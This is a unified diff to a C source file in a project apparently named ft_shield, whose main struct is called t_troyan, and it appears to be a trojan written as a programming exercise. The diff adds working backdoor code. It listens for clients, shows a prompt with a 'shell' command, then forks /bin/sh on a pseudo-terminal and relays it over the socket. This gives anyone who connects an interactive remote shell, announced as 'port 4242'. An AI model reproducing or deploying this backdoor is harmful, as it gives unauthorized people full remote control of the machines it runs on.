@@ -1,4 +1,6 @@
-# include "../include/ft_shield.h"
+# include "ft_shield.h"
+#include <pty.h>
+#include <termios.h>
 
 int init_servsocket(t_troyan *shield)
 {
@@ -33,7 +35,7 @@ int init_servsocket(t_troyan *shield)
 }
 
 
-void    ft_connection(t_troyan *shield, int socket_client)
+/*void    ft_connection(t_troyan *shield, int socket_client)
 {
     char *args[] = {"/bin/sh", NULL};
 
@@ -50,6 +52,110 @@ void    ft_connection(t_troyan *shield, int socket_client)
     }
     else
         close(socket_client);
+}*/
+
+static void	ft_relay(int client_fd, int pty_master)
+{
+	fd_set	fds;
+	char	buf[1024];
+	int		n;
+	int		max_fd;
+
+	max_fd = client_fd > pty_master ? client_fd : pty_master;
+	while (1)
+	{
+		FD_ZERO(&fds);
+		FD_SET(client_fd, &fds);
+		FD_SET(pty_master, &fds);
+		if (select(max_fd + 1, &fds, NULL, NULL, NULL) < 0)
+			break ;
+
+		if (FD_ISSET(client_fd, &fds))
+		{
+			n = read(client_fd, buf, sizeof(buf));
+			if (n <= 0)
+				break ;
+			write(pty_master, buf, n);
+		}
+
+		if (FD_ISSET(pty_master, &fds))
+		{
+			n = read(pty_master, buf, sizeof(buf));
+			if (n <= 0)
+				break ;
+			write(client_fd, buf, n);
+		}
+	}
+}
+
+static void	ft_run_shell(int client_fd)
+{
+	int		pty_master;
+	int		pty_slave;
+	pid_t	pid;
+
+	if (openpty(&pty_master, &pty_slave, NULL, NULL, NULL) < 0)
+		return ;
+
+	pid = fork();
+	if (pid < 0)
+	{
+		close(pty_master);
+		close(pty_slave);
+		return ;
+	}
+	if (pid == 0)
+	{
+		close(pty_master);
+		setsid();
+		ioctl(pty_slave, TIOCSCTTY, 0);
+		dup2(pty_slave, STDIN_FILENO);
+		dup2(pty_slave, STDOUT_FILENO);
+		dup2(pty_slave, STDERR_FILENO);
+		close(pty_slave);
+		char *argv[] = {"/bin/sh", NULL};
+		char *envp[] = {"TERM=xterm", NULL};
+		execve("/bin/sh", argv, envp);
+		exit(1);
+	}
+	close(pty_slave);
+	ft_relay(client_fd, pty_master);
+	close(pty_master);
+	waitpid(pid, NULL, 0);
+}
+
+void	ft_connection(int client_fd)
+{
+	char	buffer[256];
+	int		bytes;
+
+    write(client_fd, "press ? to show help\n", 22);
+	signal(SIGCHLD, SIG_IGN);
+	while (1)
+	{
+		write(client_fd, "$> ", 3);
+		memset(buffer, 0, sizeof(buffer));
+		bytes = read(client_fd, buffer, sizeof(buffer) - 1);
+		if (bytes <= 0)
+			return ;
+
+		if (buffer[bytes - 1] == '\n')
+			buffer[--bytes] = '\0';
+		if (bytes > 0 && buffer[bytes - 1] == '\r')
+			buffer[--bytes] = '\0';
+
+		if (strcmp(buffer, "?") == 0)
+		{
+			write(client_fd, "? -> show help\n", 16);
+			write(client_fd, "shell -> spawn remote shell\n", 29);
+		}
+		else if (strcmp(buffer, "shell") == 0)
+		{
+			write(client_fd, "Spawning shell on port 4242\n", 28);
+			ft_run_shell(client_fd);
+			return ;
+		}
+	}
 }
 
 int loop_server(t_troyan *shield)
@@ -118,7 +224,7 @@ int loop_server(t_troyan *shield)
         {
             if (clients[i] > 0 && FD_ISSET(clients[i], &readfds))
             {
-                ft_connection(shield, clients[i]);
+                ft_connection(clients[i]);
                 clients[i] = 0;
             }
         }
